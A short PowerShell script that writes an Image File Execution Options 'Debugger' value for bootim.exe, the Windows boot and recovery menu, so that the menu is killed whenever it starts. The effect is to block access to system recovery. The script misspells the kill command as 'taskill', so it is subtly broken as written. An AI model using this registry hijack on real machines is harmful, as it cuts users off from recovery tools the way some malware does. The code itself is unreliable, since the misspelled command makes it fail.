#####################
#                   #
## Created by Will ##
#                   #
#####################

#set to run at recovery
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bootim.exe"

#task kills itself
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bootim.exe" -Name "Debugger" -Type "String" -Value "taskill /F /IM bootim.exe" -Force